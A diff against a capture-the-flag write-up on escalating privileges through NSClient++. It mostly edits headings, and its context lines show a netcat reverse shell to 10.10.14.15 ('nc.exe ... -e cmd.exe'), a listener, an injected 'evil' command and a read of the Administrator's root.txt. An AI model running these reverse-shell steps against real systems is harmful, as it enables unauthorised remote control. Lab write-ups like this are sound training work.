@@ -500,7 +500,7 @@ c:\Temp\nc.exe 10.10.14.15 4443 -e cmd.exe
 
 When logging in, it was found that the login failed. After research, it was found that nsclient.ini would allow access the Web interface only from the specified host. \(127.0.0.1 in this case\)
 
-### Using SSH to create a redirect tunnel \(Local Port Forwarding\)
+#### Using SSH to create a redirect tunnel \(Local Port Forwarding\)
 
 [https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/](https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/)
 
@@ -545,6 +545,8 @@ Enter host password for user 'admin':
 {"command":"evil","lines":[{"message":"Command evil didn't terminate within the timeout period 60s","pe
 rf":{}}],"result":3}
 ```
+
+### Getting a root shell
 
 ```text
 zweilos@kalimaa:~$ nc -lvnp 12345
@@ -610,6 +612,13 @@ SeCreateSymbolicLinkPrivilege             Create symbolic links                 
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
 
 ERROR: Unable to get user claims information.
+```
+
+### root.txt
+
+Apparently in cmd.exe shell the direction of the slash is important!
+
+```text
 
 C:\Program Files\NSClient++>type C:/Users/Administrator/Desktop/root.txt
 type C:/Users/Administrator/Desktop/root.txt
